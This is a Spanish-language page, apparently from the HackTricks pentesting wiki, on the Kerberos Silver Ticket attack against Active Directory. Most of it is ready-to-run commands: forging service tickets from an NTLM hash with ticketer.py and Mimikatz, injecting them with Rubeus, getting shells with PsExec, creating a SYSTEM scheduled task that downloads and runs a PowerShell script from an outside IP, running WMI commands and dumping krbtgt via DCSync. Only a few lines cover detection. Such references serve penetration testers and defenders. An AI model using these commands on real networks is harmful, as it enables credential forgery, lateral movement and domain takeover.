# Silver Ticket

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo imposible - ¡**estamos contratando**! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Silver ticket

El ataque de Silver ticket se basa en **crear un TGS válido para un servicio una vez que se posee el hash NTLM del servicio** (como el hash de la **cuenta de PC**). Por lo tanto, es posible **obtener acceso a ese servicio** falsificando un TGS personalizado **como cualquier usuario**.

En este caso, se **posee el hash NTLM de una cuenta de computadora** (que es una especie de cuenta de usuario en AD). Por lo tanto, es posible **crear** un **ticket** para **ingresar a esa máquina** con privilegios de **administrador** a través del servicio SMB. Las cuentas de computadora restablecen sus contraseñas cada 30 días de forma predeterminada.

También se debe tener en cuenta que es posible y **preferible** (opsec) **falsificar tickets utilizando las claves AES Kerberos (AES128 y AES256)**. Para saber cómo generar una clave AES, lee: [sección 4.4 de MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) o el [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

En Windows, **Mimikatz** se puede utilizar para **crear** el **ticket**. A continuación, el ticket se **inyecta** con **Rubeus**, y finalmente se puede obtener una shell remota gracias a **PsExec**.

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

El servicio **CIFS** es el que te permite **acceder al sistema de archivos de la víctima**. Puedes encontrar otros servicios aquí: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** Por ejemplo, puedes usar el servicio **HOST** para crear una _**schtask**_ en una computadora. Luego puedes verificar si esto ha funcionado intentando listar las tareas de la víctima: `schtasks /S <nombre de host>` o puedes usar los servicios **HOST y** **RPCSS** para ejecutar consultas **WMI** en una computadora, pruébalo haciendo: `Get-WmiObject -Class win32_operatingsystem -ComputerName <nombre de host>`

### Mitigación

Eventos de tickets de plata (más sigilosos que los tickets de oro):

* 4624: Inicio de sesión de cuenta
* 4634: Cierre de sesión de cuenta
* 4672: Inicio de sesión de administrador

[**Más información sobre los tickets de plata en ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## Servicios disponibles

| Tipo de servicio                          | Tickets de plata del servicio                                            |
| ----------------------------------------- | ------------------------------------------------------------------------ |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                  |
| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>Dependiendo del sistema operativo también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones puedes simplemente solicitar: WINRM</p> |
| Tareas programadas                        | HOST                                                                     |
| Compartir archivos de Windows, también psexec | CIFS                                                                   |
| Operaciones LDAP, incluido DCSync          | LDAP                                                                     |
| Herramientas de administración remota de servidores de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
| Tickets de oro                            | krbtgt                                                                   |

Usando **Rubeus**, puedes **solicitar todos** estos tickets utilizando el parámetro:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## Abuso de tickets de servicio

En los siguientes ejemplos, imaginemos que el ticket se obtiene suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` a través de **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto simplemente haciendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
También podrás obtener una shell dentro del host o ejecutar comandos arbitrarios utilizando **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Con este permiso podrás generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema víctima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encuentra más información sobre wmiexec en la siguiente página:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Con acceso winrm a una computadora, puedes **acceder a ella** e incluso obtener un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la siguiente página para aprender **más formas de conectarse a un host remoto utilizando winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ten en cuenta que **winrm debe estar activo y escuchando** en la computadora remota para acceder a ella.
{% endhint %}

### LDAP

Con este privilegio puedes volcar la base de datos del controlador de dominio utilizando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Aprende más sobre DCSync** en la siguiente página:

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere fluidez en polaco, tanto escrito como hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
